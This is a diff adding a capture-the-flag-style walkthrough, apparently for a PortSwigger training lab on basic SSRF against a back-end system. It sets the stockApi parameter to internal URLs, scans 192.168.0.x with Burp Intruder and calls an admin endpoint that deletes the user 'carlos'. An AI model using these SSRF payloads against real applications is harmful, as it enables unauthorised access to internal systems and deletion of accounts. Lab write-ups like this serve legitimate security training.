@@ -4,3 +4,14 @@ solution:
     step-1: in burpsuite, change stockApi to stockApi=http://localhost/admin
     step-2: look at response, and copy url for deleting user 'carlos'. paste url in stockApi: stockApi=http://localhost/admin/delete?username=carlos
 
+[lab: Basic SSRF against another back-end system]
+url: https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system
+solution:
+    step-1: in burpsuite, send intercept to intruder after clicking 'check stock'
+    step-2: change 'stockApi' parameter to stockApi=http%3A%2F%2F192.168.0.§1§%3A8080%2Fadmin
+    step-3: navigate to payloads; select 'numbers' for payload type; set payload options from 1 to 255 with 1 step and min integer digits=1 and max digits=3
+    step-4: when a 200 response status is returned, stop the attack and view the response for the url of the delete user 'carlos'
+    step-5: click 'action' then send the attack to repeater
+    step-6: append url to delete 'carlos' to the stockApi parameter (i.e. - stockApi=http://192.168.0.218:8080/admin/delete?username=carlos)
+
+
